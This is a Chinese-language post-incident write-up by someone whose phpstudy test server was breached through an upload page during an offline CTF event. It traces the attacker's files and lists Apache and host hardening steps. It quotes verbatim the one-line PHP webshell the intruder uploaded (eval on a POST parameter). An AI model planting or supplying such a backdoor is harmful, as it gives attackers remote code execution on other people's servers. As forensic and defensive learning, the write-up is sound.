#20170728 某线下赛被撸串
* 线下 or 不安全的网络环境不要开服务，不要开端口。 
* 保持网络监控：
离开风险网络后随时留意个人安全动向，手机验证码 + 网站的访问记录历史等。





##情况描述
某线下赛，布置题目期间。

本机服务phpstudy，开放80端口，在内网里被扫到了，phpstudy权限很高，httpd.conf里的配置是Allow from all。WWW 下面有几套 cms 和 自己练习的upload模板。







##溯源
没流量确实没法看操作了，但能看到那哥们对文件操作的结果。

everything *按时间排序 查找所有文件，查看当时文件修改创建情况
<div>align=center><img src="everything.png" width="400"/></div>

###上传点：
缘起upload/upload.php(index.php)，马被上传到了upload文件夹下
a href = folder[Upload]

`当时的上传点:`
<div ><img src="php.png" width="300"/></div>



###溯源后发现：
<div><img src="directory.jpg" width="300"/></div>

a href=./so.php 2017/07/08 15:58
    <?php
    eval($_POST[cmd]);
    ?>  
    
a href=./config.inc.php，看修改日期，是大马。

原先存在相似的文件名称，为：```D:\phpStudy\zhouWWW\phpMyAdmin\setup\frames\config.inc.php```
<br>
<br>
<br>
*有大佬能指点下xdebug输出的 cachegrind 文件怎么分析的不？不胜赐教！文件内容大同小异，如下：*
<div><img src="cache1.jpg" width="300"/></div>
能看到利用php的操作:
<div><img src="cache2.jpg" width="300"/></div>





##师兄建议：

    进程 异常网络连接 系统日志 win防火墙；系统带的工具别当摆设
    用PHPstudy要记得降权
    nat + 虚拟机



<br><br><br><br><br><br><br><br><br><br><br><br><br><br>



##延伸 

###1. httpd安全配置

apache 的配置文件 D:\phpStudy\Apache\conf\httpd.conf（针对phpstudy）

##### 1.1 监听ip修改：

`<Directory />`标签下

Allow from 127.0.0.1

##### 1.2 apache-log：

开启访问请求日志

`<IfModule log_config_module>`标签下
    
CustomLog D:\phpStudy\Apache\apache-access-log common

<!--Apache服务器的访问日志名称在linux下默认：access_log，windows下是access.log文件
-->
##### 1.3 index.html

`<IfModule dir_module>`标签下

DirectoryIndex index.html index.php

##### 1.4 禁列目录

`<Directory />`标签下

Options +Indexes +FollowSymLinks +ExecCGI

去掉Indexes。(Indexes表示若当前目录没有index.html就会显示目录结构)

- 1.5 权限控制调整

apache的执行权限

#####上面的针对个人测试代码环境的安全加固已经差不多了。关于服务器方面，这里有本lamp加固，就不重复造轮子了。

<br>

###2.  .htaccess

[wiki：.htaccess](https://wiki.apache.org/httpd/Htaccess)


#总之：别裸奔。。。

保存上述修改后，一定记得要 restart 一次Apache服务使修改生效。


###2. 内网扫描 
nmap，xxx，xxx

###3. 线下时的蜜罐
拉个docker


---

---
最后，教训深刻，感谢：师傅提醒被撸 以及 师兄的建议！